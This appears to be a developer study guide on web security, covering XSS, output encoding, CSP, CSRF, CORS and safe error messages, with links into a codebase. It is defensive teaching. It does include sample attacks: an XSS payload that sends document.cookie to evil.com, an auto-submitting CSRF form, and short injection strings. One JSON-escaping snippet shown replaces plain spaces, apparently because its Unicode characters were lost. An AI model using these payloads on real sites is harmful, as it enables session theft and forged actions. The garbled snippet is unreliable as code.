# Web Security: XSS, Output Encoding, CSP, CSRF, CORS, Safe Errors

> **Covers:** CSRF token patterns, Content Security Policy (CSP), output encoding examples and safer error messaging.

Each section below is written so you can **explain, show an example, and name the trade-offs**.

---

## 1. XSS (Cross-Site Scripting)

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [`renderUserMarkdown`](../../packages/backend/libs/domains/community/domain/content.ts#L20): renderUserMarkdown converts user markdown to HTML with the marked parser and an allowlist sanitizer, so stored XSS is blocked in community content. _(content.ts)_
<!-- theory-links:end -->

### 1.1 What XSS is
XSS = the attacker gets the browser to treat **their text as HTML/JavaScript** inside **your origin**. The browser can't tell the injected code apart from your own, so it can do anything your code can:
- read the page (personal data, CSRF tokens),
- call your API **as the user** (cookies are attached automatically),
- read tokens from `localStorage`,
- change the UI (fake login forms) and log keystrokes.

`HttpOnly` cookies only stop the script from *reading* the session cookie. It can still *use* the session while the page is open.

### 1.2 How the payload gets into the page

| Type | Path of the payload | Who is hit | Example |
|---|---|---|---|
| **Stored** | attacker input → saved in DB → server renders it raw into pages | **every** viewer, no click needed (worst; enables "XSS worms" like MySpace Samy, 2005) | comment body `<img src=x onerror=fetch('//evil.com?c='+document.cookie)>` |
| **Reflected** | attacker input in a URL → server echoes it raw into the response | whoever opens the crafted link (needs phishing) | `/search?q=<script>…</script>` → page says `You searched for: <script>…</script>` |
| **DOM-based** | attacker input in the URL/messages → **your frontend JS** writes it into an HTML sink; the server never renders it | whoever opens the crafted link | `el.innerHTML = location.hash.slice(1)` with `…/page#<img src=x onerror=…>` |

- **Stored**: the payload is harmless while it sits in the DB. The bug is at **output**: the server builds `<div class="comment">` + raw comment + `</div>`, the victim's browser parses a real `<img>`, `src=x` fails to load, and `onerror` runs the attacker's code.
- **Reflected**: nothing is stored. The attacker sends a link (usually URL-encoded to look harmless), the server pastes the parameter into the HTML it returns, and the script runs for that one victim.
- **DOM-based**: the payload often sits after `#`, which is **never sent to the server**, so server-side filtering and logs can't see it.
  - **Sources** (attacker-controlled values): `location` (hash, search, pathname), `document.referrer`, `postMessage` data, `window.name`, user-generated values from APIs or storage.
  - **Sinks** (APIs that turn strings into markup or code): `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`, `setTimeout("string")`, `javascript:` URLs in `href`/`location`, jQuery `$(html)`/`.html()`, React `dangerouslySetInnerHTML`.

**When injected markup executes** depends on how it reaches the page:

| How the markup arrives | `<script>` runs? | Event handler (`<img onerror>`, `<svg onload>`) runs? |
|---|---|---|
| In the **HTML document the server sends** (stored/reflected), parsed by the normal page parser | ✅ like any script on the page | ✅ |
| Inserted later by JS via `innerHTML` / `insertAdjacentHTML` (typical DOM-based) | ❌ (spec rule) | ✅ |
| Via `document.write`, or `createElement('script')` + append | ✅ | ✅ |

That's why payloads usually use event handlers: they run in **every** context and get past naive filters that only block the word `script`. Browsers offer no safety net: built-in "XSS auditors" were removed (Chrome's in 2019).

### 1.3 Defenses

| Layer | What it does | Stops |
|---|---|---|
| **1. Escaping (output encoding)**, by default in frameworks | user data is shown as text, never parsed as markup | stored + reflected; DOM-based when safe APIs are used |
| **2. Sanitizing**, only where user HTML must be rendered | keeps safe tags, strips `<script>`, `on*` handlers, `javascript:` | stored XSS via rich content |
| **3. URL scheme validation** for user-supplied links | allows only `http:`/`https:`/`mailto:` | `javascript:` URL injection |
| **4. Safe DOM APIs + Trusted Types** | `textContent` instead of `innerHTML`; sinks reject unapproved strings | DOM-based |
| **5. CSP** with nonces (§2) | injected inline scripts/handlers don't run even if 1–4 fail | all three, as a second layer |
| **6. `HttpOnly` cookies** | session cookie can't be read by JS | limits damage only |


#### Escaping, output encoding

The rule: **encode at output time, for the context where the data lands.** Input validation helps but isn't enough, because the same data ends up in HTML, JS, URLs, and CSV.

**Frameworks do it for you.** React, Vue, Angular, Svelte, and server templates (EJS `<%= %>`, Handlebars `{{ }}`, Jinja `{{ }}`, Pug) escape every normal interpolation. Nobody should convert `<` to `&lt;` by hand. An app is vulnerable only where it **bypasses** that default (React shown here; other stacks have the same escape hatches: Vue `v-html`, Angular `bypassSecurityTrustHtml`, EJS `<%- %>`, Handlebars `{{{ }}}`, Jinja `|safe`, jQuery `.html()`):

| Pattern for React | Is it safe? | Why |
|---|---|---|
| Text: `<p>{text}</p>` | ✅ | rendered as text; `<img onerror>` appears literally on screen |
| Attribute values: `value={x}`, `title={x}`, `className={x}` | ✅ | quotes escaped, so the value can't break out and add `onerror=` |
| **URL attributes with user input**: `<a href={user.website}>`, `<iframe src>`, `<form action>`, `<button formAction>`, `<object data>`, SVG `xlink:href` | ❌ unless validated | escaped, but the browser **interprets it as a URL**, and `javascript:fetch(...)` **is code** (runs on click/load). React only warns in dev → validate with `safeHref` below. Own routes and validated URLs are fine. (`<img src="javascript:…">` doesn't execute in modern browsers.) |
| `dangerouslySetInnerHTML={{ __html: x }}` | ❌ unless `x` is sanitized | raw HTML, no escaping, no sanitizing |
| **Direct DOM access via refs** (`ref.current.innerHTML = x`) | ❌ | `useRef` gives the real DOM element, which bypasses React. Use `textContent` |
| Third-party libraries writing to the DOM (chart tooltips with HTML formatters, rich-text editors, map popups, jQuery plugins) | ❌ if fed user input | React only protects what **React** renders |
| Spreading user-controlled props: `<div {...userProps}>` | ❌ | could include `dangerouslySetInnerHTML`, `href`, handlers |

```tsx
// Direct DOM access through a ref bypasses React's escaping
const ref = useRef<HTMLDivElement>(null);
useEffect(() => {
  ref.current!.innerHTML = props.comment;        // ❌ raw HTML insertion
  // ref.current!.textContent = props.comment;   // ✅ plain text
}, [props.comment]);
return <div ref={ref} />;
```

Classic bug in social/feed apps: **linkifying hashtags, mentions, and URLs** with a regex into an HTML string, then rendering it raw:
```tsx
// ❌ any <img onerror> in the post text is rendered as HTML too
const html = post.text.replace(/#(\w+)/g, '<a href="/tag/$1">#$1</a>');
return <p dangerouslySetInnerHTML={{ __html: html }} />;

// ✅ split into tokens and render React elements; the plain-text parts stay escaped
return <p>{post.text.split(/(#\w+)/g).map((part, i) =>
  part.startsWith('#') ? <a key={i} href={`/tag/${part.slice(1)}`}>{part}</a> : part)}</p>;
```

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [`interpolate`](../../packages/backend/libs/domains/notifications/domain/templates.ts#L21): interpolate in the notification templates replaces {{var}} and HTML-escapes the value when the template is flagged as HTML. _(templates.ts)_
> - [`render`](../../packages/backend/libs/domains/notifications/domain/templates.ts#L35): render builds the notification email HTML through the escaping interpolate step. _(templates.ts)_
<!-- theory-links:end -->

#### Escaping by context
What frameworks do internally, and what you must do by hand when building output yourself.

| Context | Rule |
|---|---|
| HTML body | escape `&`, `<`, `>`, `"`, `'` |
| HTML attribute | always quote the attribute and encode the value; never put user data in event-handler attributes (`onclick`) or `style` |
| URL parameter | `encodeURIComponent` |
| User-supplied full URL | validate the scheme (allowlist), since encoding isn't enough |
| Inline JS / JSON in a script tag | escape `<`, `>`, `&`, U+2028, U+2029; never build code from strings |
| CSS | don't put user data in CSS; if unavoidable, validate strictly (e.g. `^#[0-9a-f]{6}$` for a color) |
| DOM (client-side JS) | `textContent`, `setAttribute` with validated values, `createElement` instead of HTML strings |
| CSV export | prefix cells starting with `=`, `+`, `-`, `@`, tab, or CR with `'` (formula injection) |
| Logs | structured JSON logging (pino), so newlines can't forge log lines |
| HTTP headers | reject CR/LF (Node does this automatically) |
| SQL | parameterized queries (§6) |
| Email templates | HTML-encode, same as web pages |

**HTML body.** Escaping turns markup into text:

```ts
function escapeHtml(s: string) {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;').replace(/'/g, '&#x27;');
}
// input:  <script>alert(1)</script>
// output: &lt;script&gt;alert(1)&lt;/script&gt;   (shown as text)
```

**HTML attributes.** Unquoted attributes can be broken out of:

```html
<!-- v = "x onmouseover=alert(1)" -->
<input value=<%= v %>>       <!-- ❌ adds an onmouseover handler -->
<input value="<%= v %>">     <!-- ✅ quoted and encoded -->
```

**URLs.** Encode parameter values. For full URLs supplied by users, check the scheme:

```ts
const url = `/search?q=${encodeURIComponent(userInput)}`;

function safeHref(input: string): string {
  try {
    const u = new URL(input, 'https://example.com');
    return ['http:', 'https:', 'mailto:'].includes(u.protocol) ? u.href : '#';
  } catch {
    return '#';
  }
}
// blocks javascript:, data:text/html, vbscript:
```

**Inline JSON for hydration.** `JSON.stringify` doesn't escape a closing script tag, so a value containing one ends the script block early and starts attacker markup:

```html
<!-- ❌ breaks out if state contains a closing script tag -->
<script>window.__STATE__ = <%- JSON.stringify(state) %></script>
```

```ts
// ✅ escape characters that can end the script or be misparsed
const safeJson = JSON.stringify(state)
  .replace(/</g, '\\u003c')
  .replace(/>/g, '\\u003e')
  .replace(/&/g, '\\u0026')
  .replace(/ /g, '\\u2028')
  .replace(/ /g, '\\u2029');
// alternatives: serialize-javascript, or <script type="application/json"> + JSON.parse(textContent)
```

Never build code from strings: no `eval`, `new Function`, or `setTimeout(string)` with user data.

**CSV exports (formula injection).** Spreadsheet apps execute cells that start with `=`, `+`, `-`, `@`, tab, or CR (e.g. `=HYPERLINK(...)`). Prefix such cells with `'`. This matters for finance exports.

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [`csvCell`](../../packages/backend/libs/domains/statements/infra/statement-export.ts#L10): csvCell quotes and escapes CSV cells and neutralizes formula injection, which is the CSV output context. _(statement-export.ts)_
> - [`interpolate`](../../packages/backend/libs/domains/notifications/domain/templates.ts#L21): interpolate applies HTML escaping for the HTML context. _(templates.ts)_
<!-- theory-links:end -->

#### Sanitizing: when user HTML must be rendered
Escaping shows input **as text**, so it can't display formatting. Some features must render **user-provided HTML**: rich-text editor output, markdown → HTML, CMS content, HTML emails, LLM output shown as HTML. There, you pass HTML to the page (`dangerouslySetInnerHTML`, `v-html`), and frameworks do **no** cleaning. A **sanitizer** keeps the allowed tags and strips the dangerous parts:

| Input `<b>hi</b><img src=x onerror=…>` | Result |
|---|---|
| escaped | shown literally as `<b>hi</b><img src=x onerror=…>` |
| sanitized | **bold "hi"**; the `<img onerror>` is removed |

```ts
import DOMPurify from 'isomorphic-dompurify';
const clean = DOMPurify.sanitize(markdownToHtml(input), {
  ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'ul', 'li', 'code', 'pre'], ALLOWED_ATTR: ['href'],
});
```
- **DOMPurify** is an open-source **library** (Cure53; npm `dompurify`), not a browser API. It parses the HTML with the browser's DOM parser and removes everything not on its allowlist (`<script>`, `on*` handlers, `javascript:` URLs, …). On the server it needs `jsdom` (`isomorphic-dompurify`).
- **HTML Sanitizer API** (`element.setHTML(untrusted)`): the native equivalent, being standardized and rolled out in browsers. Check support; DOMPurify remains the default.
- **Trusted Types** (a browser API): sinks like `innerHTML` reject plain strings and accept only values produced by an approved policy (typically one calling DOMPurify), so no code path can forget to sanitize.
- Sanitize at **render time** (or on input *and* at render). Sanitizer bypasses get discovered and fixed, and re-sanitizing at output protects old stored data too.
- Apps that never render user-provided HTML need no sanitizer at all; escaping covers them.

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [`renderUserMarkdown`](../../packages/backend/libs/domains/community/domain/content.ts#L20): renderUserMarkdown runs the marked output through an allowlist sanitizer before it is rendered as user HTML. _(content.ts)_
<!-- theory-links:end -->

---

## 2. Content Security Policy (CSP)

CSP is a response header that tells the browser **which sources of script, style, frames, and connections are allowed**. If an attacker injects markup, the browser **refuses to execute** scripts that don't match. It's a mitigation layer, not a replacement for encoding.

### 2.1 Strict CSP (recommended modern approach: nonce + strict-dynamic)
```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-R4nd0mPerRequest' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  form-action 'self';
  img-src 'self' data: https://cdn.example.com;
  connect-src 'self' https://api.example.com;
  upgrade-insecure-requests;
  report-to csp-endpoint;
```
How it works:
- The server generates a **cryptographically random nonce per response** and adds it to the header and to every legitimate `<script nonce="...">`. Injected scripts don't know the nonce, so they're blocked.
- `'strict-dynamic'`: scripts loaded **by** a trusted (nonced) script are trusted too, which makes bundlers and tag managers workable.
- `https:` and `'unsafe-inline'` are **fallbacks for old browsers** only. Browsers that support nonces/strict-dynamic **ignore** them.
- `object-src 'none'` blocks plugin-based XSS. `base-uri 'none'` stops `<base href>` injection from rewriting relative script URLs.
- **Inline event handlers** (`onclick="..."`) and `javascript:` URLs are blocked under strict CSP, so refactor them to `addEventListener`.

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [`web/next.config.ts`](../../packages/web/next.config.ts): next.config.ts sets the web app's security headers, which is where its CSP lives.
<!-- theory-links:end -->

### 2.2 Why allowlist CSPs (`script-src 'self' cdn.jsdelivr.net`) are weak
Allowlisted domains often host **JSONP endpoints** or old Angular versions that let an attacker run arbitrary code ("script gadgets"). Google's research found most allowlist CSPs bypassable. Use **nonces or hashes**.

### 2.3 Hashes for static pages
`script-src 'sha256-abc...='` allows exactly that inline script content. Good for static sites or SSG where per-request nonces aren't possible.

### 2.4 Rollout process (shows maturity)
1. Deploy `Content-Security-Policy-Report-Only` with a `report-to`/`report-uri` endpoint.
2. Collect violations for 1–2 weeks and fix legitimate ones (inline scripts, third-party widgets).
3. Switch to enforcing mode. Keep the reporting on, alert on spikes (a spike may mean an attack, or a broken deploy).
4. Include CSP in code review. Adding a third-party script is a security decision.

### 2.5 Next.js nonce implementation (middleware/proxy)
```ts
export function middleware(req: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
  const csp = `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';`;
  const headers = new Headers(req.headers);
  headers.set('x-nonce', nonce);                     // read in layout via headers() and pass to <Script nonce>
  const res = NextResponse.next({ request: { headers } });
  res.headers.set('Content-Security-Policy', csp);
  return res;
}
```
Note: nonces **force dynamic rendering**, because every response must differ. That's a trade-off against static caching (use hashes or SRI-based approaches for static pages).

### 2.6 Other CSP directives
- `frame-ancestors 'none' | 'self'` is clickjacking protection (supersedes `X-Frame-Options`).
- `connect-src` limits where `fetch`/XHR/WebSocket can send data, which makes exfiltration harder.
- `require-trusted-types-for 'script'` turns on **Trusted Types**: DOM sinks like `innerHTML` only accept typed objects produced by registered policies, which kills DOM XSS at the API level.

### 2.7 The other security headers (helmet sets most of them)
| Header | Value | Purpose |
|---|---|---|
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` | force HTTPS, stop SSL stripping |
| `X-Content-Type-Options` | `nosniff` | stop MIME sniffing (e.g., uploaded "image" executed as script) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | don't leak paths/tokens in Referer |
| `Permissions-Policy` | `camera=(), geolocation=()` | disable powerful features |
| `Cross-Origin-Opener-Policy` | `same-origin` | isolate window from cross-origin popups (XS-Leaks, Spectre) |
| `Cross-Origin-Resource-Policy` | `same-origin` | stop other sites embedding your resources |

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [`configureHttpApp`](../../packages/backend/libs/infrastructure/platform/bootstrap-http.ts#L12): configureHttpApp applies the shared HTTP security headers, CORS and validation for the Nest apps. _(bootstrap-http.ts)_ · [platform](../../docs/humans/concepts/platform-platform/platform.md)
> - [`web/next.config.ts`](../../packages/web/next.config.ts): next.config.ts sets security headers for the Next.js web app.
<!-- theory-links:end -->

---

## 3. CSRF (Cross-Site Request Forgery)

### 3.1 How the attack works
An attacker's page makes the victim's browser send a **state-changing request** to your site, and the browser **attaches the victim's cookies automatically**. The attacker never sees the response, and doesn't need to: the transfer or email change has already happened.

```html
<!-- on evil.com -->
<form action="https://bank.example.com/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
```

CSRF applies whenever the browser sends credentials **ambiently**: cookies, HTTP Basic auth, client certificates. A bearer token that your JS puts in the `Authorization` header isn't sent automatically, so CSRF doesn't apply to it, but that token is then readable by XSS (a trade-off).

**CSRF vs XSS.** CSRF does **not** need XSS: the classic attack runs entirely from the attacker's own site, and the only bug required is a missing CSRF defense on yours. The relationship goes the other way: **XSS on your origin defeats every CSRF defense**, because the injected script runs *as* your site. It can read the CSRF token from the page or cookie and send same-origin requests, so XSS doesn't need CSRF at all. XSS on a *sibling subdomain* is the in-between case: it isn't your origin, but it's the same *site*, which bypasses `SameSite` (gap 1 below).

**Why the browser allows it.** The same-origin policy restricts **reading** other sites' data, not **sending** requests to them. Links, form posts, and embeds to any site have always been part of the web:

| Cross-site action from `evil.com` | Sent? |
|---|---|
| Link, navigation, HTML form submit (GET or POST) | ✅ with the user's cookies, unless `SameSite` withholds them |
| Embeds: `<img>`, `<script>`, `<iframe>` | ✅ |
| `fetch` "simple" request (GET/POST with form or plain-text body, no custom headers) | ✅ no preflight; only reading the response is blocked |
| `fetch` with JSON content type, custom headers, PUT/DELETE | only if your server approves the CORS preflight |
| Reading the response, DOM, or cookies of your site | ❌ blocked |

The server receives these requests like any other. It only knows where a request came from if it checks the `Origin` or `Sec-Fetch-Site` headers, which is defense C below.

### 3.2 Defenses

| Defense | Idea | Notes |
|---|---|---|
| A. CSRF token | every state-changing request must carry a secret value the attacker can't read | strongest; needs server-side generation and verification |
| B. `SameSite` cookies | browser doesn't attach the cookie to cross-site requests | strong baseline, but has gaps (below) |
| C. Origin / Fetch Metadata check | server rejects requests whose `Origin`/`Sec-Fetch-Site` shows another site | cheap; must handle missing headers |
| D. Custom header / JSON-only + strict CORS | forms can't send custom headers; cross-site `fetch` with them needs a preflight you refuse | good for JSON APIs; breaks if CORS is misconfigured |

#### A. CSRF tokens
**The server generates and verifies the token. The frontend only carries it.** A token generated in the browser would be useless, because the attacker's page could generate one just as easily. The protection comes from a value that the **server** issued to **this user's session** and that `evil.com` can't **read**: the same-origin policy stops `evil.com` from reading your pages, cookies, or API responses, which is where the token lives.

An attacker can open `youtube.com` in their own browser and look at a token, but that's **their own** token, tied to **their** session. It's useless against the victim's session. The secret used to create or sign tokens never leaves the backend (env var or secret manager).

Two ways to implement it:

**Synchronizer token (stateful).**
1. On login or page load, the server generates a random token and stores it in the user's **server-side session**: `req.session` in Express is server-side session data (in memory, Redis, or a DB), found via the session-ID cookie. It's not the browser's `sessionStorage`.
2. The server puts the token into the page (hidden form field or `<meta>` tag), or returns it from an endpoint such as `GET /csrf-token`.
3. The frontend sends it back on every state-changing request (`X-CSRF-Token` header or a form field).
4. The server compares it with the session value in constant time, and rejects mismatches with 403.

```ts
// issue
req.session.csrf ??= randomBytes(32).toString('base64url');
res.render('form', { csrf: req.session.csrf });

// verify (middleware for POST/PUT/PATCH/DELETE)
const sent = Buffer.from(req.get('x-csrf-token') ?? req.body._csrf ?? '');
const expected = Buffer.from(req.session.csrf ?? '');
if (sent.length !== expected.length || !timingSafeEqual(sent, expected)) return res.sendStatus(403);
```

**Signed double-submit cookie (stateless).**
1. The server creates `token = random + "." + HMAC(serverSecret, sessionId + random)` and sets it in a cookie readable by JS (not `HttpOnly`).
2. Frontend JS reads the cookie and copies the value into a header on each state-changing request.
3. The server checks that header == cookie **and** recomputes the HMAC for the current session ID. `evil.com` can make the browser *send* the cookie, but can't *read* it to put it in the header.
4. The HMAC binding matters: a plain random value (naive double-submit) can be defeated by an attacker who can set cookies for your domain (from a sibling subdomain or over plain HTTP). Use the `__Host-` cookie prefix (requires `Secure`, `Path=/`, no `Domain`) to block subdomain overwrites.

```ts
const rand = randomBytes(16).toString('hex');
const token = `${rand}.${createHmac('sha256', SECRET).update(`${sessionId}.${rand}`).digest('hex')}`;
res.cookie('__Host-csrf', token, { secure: true, sameSite: 'lax', path: '/' });
// verify: header === cookie && HMAC recomputes for the current sessionId
```
Library: `csrf-csrf`. The old `csurf` package is deprecated.

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [`CsrfGuard`](../../packages/backend/libs/domains/identity/api/guards/csrf.guard.ts#L16): CsrfGuard implements double-submit CSRF protection for cookie-authenticated requests. _(csrf.guard.ts)_
> - [`CSRF_COOKIE`](../../packages/backend/libs/domains/identity/api/guards/csrf.guard.ts#L5): CSRF_COOKIE is the '__Host-csrf' cookie that holds the CSRF token. _(csrf.guard.ts)_
> - [`csrfHeaders`](../../packages/web/lib/api/client.ts#L30): csrfHeaders reads the __Host-csrf cookie in the web client and sends it as the x-csrf-token header. _(client.ts)_
<!-- theory-links:end -->

#### B. `SameSite` cookies
| Value | Cookie sent on cross-site requests? |
|---|---|
| `Strict` | never, not even when following a link (users arriving from an email look logged out) |
| `Lax` | only on **top-level GET navigations** (clicking a link); not on cross-site POSTs, iframes, `fetch`, or images |
| `None; Secure` | always (needed for cross-site embeds, third-party widgets, some SSO flows) |

Chromium browsers treat cookies **without** a `SameSite` attribute as `Lax`, which is why the form attack above mostly fails today. The gaps that remain:
1. **Same-site isn't same-origin.** "Site" = the registrable domain (`example.com`), so **every subdomain is same-site**. A page on `blog.example.com`, a user-content subdomain, an old marketing site with an XSS bug, or a subdomain taken over through a dangling DNS record can send requests to `app.example.com` **with** `Lax` and even `Strict` cookies. The backend doesn't filter these out by itself. The request's `Origin` is `https://blog.example.com`, so it's only rejected if the server runs an **exact-origin check** (defense C). That check often lets it through anyway:
   - many backends rely on `SameSite` alone and check nothing;
   - allowlists are often broad (`*.example.com`, a regex or `endsWith('example.com')`) because sibling apps (`admin.`, `docs.`, `m.`) **legitimately call the main API**. A compromised sibling then has the same access;
   - a Fetch Metadata policy typically allows `Sec-Fetch-Site: same-site` for some requests;
   - CORS configs that allow all subdomains *with credentials* let the compromised subdomain even **read** the responses.
   
   Subdomains can also **set cookies for the parent domain** (`Domain=example.com`), which lets them overwrite a CSRF cookie ("cookie tossing") and defeat naive double-submit. That's why the HMAC binding and the `__Host-` prefix matter (§3.2 A). Keep user-generated content on a **separate registrable domain** (GitHub uses `githubusercontent.com`, Google uses `googleusercontent.com`), so it isn't same-site at all.
2. **State-changing GETs.** `Lax` cookies are still sent on top-level GET navigations, so `GET /logout`, `GET /unsubscribe?id=…`, or `GET /approve?invoice=42` can be triggered by a link or a redirect. The same goes for frameworks that accept a method override such as `?_method=POST` on a GET.
3. **Your own cookies set with `SameSite=None`** get no protection. You need `None` when **your** app runs inside someone else's site: your widget or app embedded in a partner's page via an iframe, or a cross-site SSO flow. In those cases your session cookie must be sent on cross-site requests, which means `evil.com` can trigger requests with it too, so those endpoints need CSRF tokens or Origin checks. (A *third-party* embed on your page, such as Stripe's payment iframe, is the opposite case: Stripe's cookies and CSRF protection are Stripe's concern. XSS on your page can't read into Stripe's cross-origin iframe, but it can tamper with your own page around it: change the amount your JS passes to Stripe, or replace the embed with a fake card form to phish card details. That's an XSS and CSP problem, not CSRF.)
4. **Lax-by-default is Chromium-only.** Firefox and Safari don't apply `Lax` to cookies without the attribute, so a cookie with no `SameSite` is fully exposed there. Always set `SameSite` explicitly.
5. **Chrome's "Lax + POST" exception:** a cookie *without* an explicit `SameSite` attribute is still sent on cross-site top-level POSTs during the first **2 minutes** after it was set (to keep older SSO flows working), which is a window right after login.
6. **Non-cookie credentials** aren't covered at all: HTTP Basic auth, client certificates, IP-based trust on internal networks.

So `SameSite` is a strong baseline that removes most classic CSRF, and it's combined with a token or an Origin check for full protection.

#### C. Origin and Fetch Metadata checks
This is the "reject requests from other domains" defense. The server must implement it:
- **`Origin`**: browsers send it on POST and cross-origin requests. Reject state-changing requests whose `Origin` isn't in your allowlist, and fall back to `Referer` when `Origin` is missing. Next.js Server Actions do this (comparing `Origin` with `Host`/`X-Forwarded-Host`).
- **`Sec-Fetch-Site`** (`same-origin`, `same-site`, `cross-site`, `none`): a resource isolation policy that blocks cross-site requests except normal link navigations:

```ts
app.use((req, res, next) => {
  const site = req.get('sec-fetch-site');
  if (!site) return next();                                    // old browser: rely on other defenses
  if (['same-origin', 'none'].includes(site)) return next();   // 'none' = typed URL / bookmark
  if (site === 'same-site' && req.method === 'GET') return next();
  if (req.get('sec-fetch-mode') === 'navigate' && req.method === 'GET' && req.get('sec-fetch-dest') !== 'iframe') return next();
  return res.status(403).send('Cross-site request blocked');
});
```

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [`normalizeOrigin`](../../packages/backend/libs/domains/developer-platform/application/widget.service.ts#L28): normalizeOrigin validates and normalizes the HTTPS origins that widget sites are allowed to use. _(widget.service.ts)_
<!-- theory-links:end -->

#### D. Custom header or JSON-only APIs + strict CORS
- Require a custom header (`X-Requested-With`) or `Content-Type: application/json` on state-changing requests.
- HTML forms can't set either, and a cross-site `fetch` that sets them triggers a CORS preflight that your server refuses for unknown origins.
- Relies on a correct CORS setup: a wildcard or reflected `Origin` with credentials breaks it (§4).

### 3.3 Recommended combinations
- **Server-rendered app with forms and a session cookie**: `SameSite=Lax` + CSRF token (synchronizer or signed double-submit) + Fetch Metadata.
- **SPA calling a JSON API with a session cookie (BFF)**: `SameSite=Lax`/`Strict` + JSON-only or custom header + strict CORS allowlist + Origin check (or a token header).
- **Bearer tokens in the `Authorization` header**: CSRF doesn't apply; invest in XSS defenses (CSP), since a token in JS memory or `localStorage` can be stolen.
- **Always**: GET/HEAD never change state, and protect **login and logout** too (login CSRF: the attacker logs the victim into the attacker's account and harvests what they enter).

---

## 4. CORS: what it is and isn't

- CORS **relaxes** the same-origin policy for *reading* responses. It is **not** a protection for your server: requests still reach the server (simple requests aren't preflighted).
- Dangerous configurations:
  - Reflecting any `Origin` along with `Access-Control-Allow-Credentials: true`: any site can read authenticated responses.
  - Allowing the `null` origin (sandboxed iframes and `file:` can send it).
  - Regex mistakes: `example.com.evil.com`, or `/example\.com$/` matching `notexample.com`.
- `Access-Control-Allow-Origin: *` can't be combined with credentials (browsers refuse).
- Use a strict allowlist, `Vary: Origin`, and cache preflights (`Access-Control-Max-Age`).

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [`configureHttpApp`](../../packages/backend/libs/infrastructure/platform/bootstrap-http.ts#L12): configureHttpApp sets up the CORS configuration for the HTTP apps. _(bootstrap-http.ts)_ · [platform](../../docs/humans/concepts/platform-platform/platform.md)
> - [`WidgetSite`](../../packages/backend/libs/domains/developer-platform/application/widget.service.ts#L11): The WidgetSite record keeps a per-site origins list that is used for widget origin checks. _(widget.service.ts)_
<!-- theory-links:end -->

---

## 5. Safer error messaging

Goal: give clients **just enough** to act, log **everything** internally, and leak **nothing** useful to an attacker.

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [exceptions-filter](../../docs/humans/concepts/common-exceptions-filter/exceptions-filter.md): The global exception filter normalizes errors and sends safe responses while reporting to Sentry and OpenTelemetry.
<!-- theory-links:end -->

### 5.1 What not to leak
- Stack traces, file paths, framework or DB versions.
- Raw DB errors: `duplicate key value violates unique constraint "users_email_key"` reveals schema and confirms the record exists. `column "pasword" does not exist` helps an attacker probe SQL injection.
- Upstream error bodies passed through verbatim (they may contain internal hostnames or API keys).
- Whether a resource exists that the user can't access (use **404 instead of 403** for others' resources).
- Whether an account exists (**user enumeration**).

### 5.2 Examples

**Bad:**
```json
500 { "error": "SequelizeDatabaseError: relation \"invoice_lines\" does not exist at Query.run (/app/node_modules/sequelize/lib/dialects/postgres/query.js:50:25)" }
```
**Good:**
```json
500 {
  "type": "about:blank",
  "title": "Internal Server Error",
  "status": 500,
  "detail": "Something went wrong. If the problem persists, contact support with the reference ID.",
  "traceId": "4bf92f3577b34da6"
}
```
with the full error, stack, user ID, and request context **logged server-side** under the same `traceId`.

**Login** (anti-enumeration):
```
❌ "No account with this email"   /   "Wrong password"
✅ "Invalid email or password."   (same message, same status, similar response TIME)
```
To equalize timing, run the password hash comparison even when the user doesn't exist (compare against a dummy hash).

**Password reset:**
```
✅ "If an account exists for that email, we've sent a reset link."   (always 202)
```

**Registration** (the hard case): either accept and send an email saying "you already have an account", or rate-limit plus CAPTCHA.

**Validation errors (4xx)**: being *specific* is fine and helps legitimate users (`amountCents must be positive`), as long as you don't echo raw input back into HTML (reflected XSS).

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [`AppError`](../../packages/backend/libs/common/errors/error.types.ts#L64): AppError is an RFC 7807 error class with a public JSON form for clients and a separate debug form kept internal. _(error.types.ts)_ · [errors](../../docs/humans/concepts/common-errors/errors.md)
> - [`AppErrorJSONPublic`](../../packages/backend/libs/common/errors/error.types.ts#L4): AppErrorJSONPublic is the public error body returned to clients without debug data. _(error.types.ts)_ · [errors](../../docs/humans/concepts/common-errors/errors.md)
<!-- theory-links:end -->

### 5.3 Implementation rules
- A **global exception filter** maps known domain errors to specific 4xx responses, and everything else to a generic 500 (see the Node error-handling doc).
- `NODE_ENV=production`. Express's default error handler prints stacks in dev.
- Disable `X-Powered-By` (`app.disable('x-powered-by')`, helmet does it).
- Separate **error codes** (stable, machine-readable, documented) from **messages** (human, possibly localized).
- Redact secrets and PII in logs (pino `redact: ['req.headers.authorization', '*.password', '*.cardNumber']`).
- Monitor error rates by code, because enumeration or probing shows up as spikes in 401/404.

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [exceptions-filter](../../docs/humans/concepts/common-exceptions-filter/exceptions-filter.md): The global exception filter maps known errors to specific responses and the rest to generic ones.
> - [`ErrorArea`](../../packages/backend/libs/common/errors/error.types.ts#L53): ErrorArea separates domain, fatal and transient errors so each is handled differently. _(error.types.ts)_ · [errors](../../docs/humans/concepts/common-errors/errors.md)
<!-- theory-links:end -->

---

## 6. Injection and other server-side issues (quick but precise)

- **SQL injection**: always use parameterized queries. ORM pitfalls: `sequelize.literal()`, `sequelize.query` with string interpolation, raw `whereRaw`. **Identifiers can't be parameterized** (dynamic `ORDER BY`), so whitelist them:
  ```ts
  const SORTABLE = { createdAt: 'created_at', amount: 'amount_cents' } as const;
